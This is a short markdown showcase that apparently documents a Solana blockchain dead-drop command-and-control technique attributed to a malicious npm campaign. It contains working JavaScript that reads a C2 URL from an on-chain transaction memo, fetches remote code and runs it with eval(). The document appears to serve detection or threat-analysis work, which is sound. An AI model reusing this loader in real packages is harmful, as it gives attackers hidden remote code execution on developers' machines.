# Solana RPC Blockchain C2 Resolution

This showcase demonstrates the Solana blockchain dead-drop C2 technique observed
in the GlassWorm Wave 5 campaign (March 2026). Malicious npm packages use Solana
RPC calls to resolve command-and-control URLs from on-chain transaction memos,
then fetch and execute the decoded payload.

```js
const { Connection, PublicKey } = require("@solana/web3.js");
const conn = new Connection("https://api.mainnet-beta.solana.com");
const addr = new PublicKey("6YGcuyFRJKZtcaYCCFba9fScNUvPkGXodXE1mJiSzqDJ");

async function resolve() {
  const sigs = await conn.getSignaturesForAddress(addr, { limit: 1 });
  const tx = await conn.getTransaction(sigs[0].signature);
  const memo = tx.meta.logMessages.find(m => m.includes("Program log: Memo"));
  const c2url = Buffer.from(memo.split(": ")[2], "base64").toString();
  const resp = await fetch(c2url); eval(await resp.text());
}
resolve();
```
